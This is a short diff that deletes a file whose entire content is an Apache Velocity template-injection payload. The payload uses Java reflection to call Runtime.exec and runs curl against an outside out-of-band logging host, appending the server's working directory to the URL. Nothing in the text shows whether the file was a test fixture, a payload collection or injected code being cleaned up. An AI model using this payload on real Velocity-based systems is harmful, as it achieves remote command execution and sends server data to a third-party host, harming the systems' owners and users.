@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl http://y84x7g.ceye.io/?`pwd`",null,null).toString();
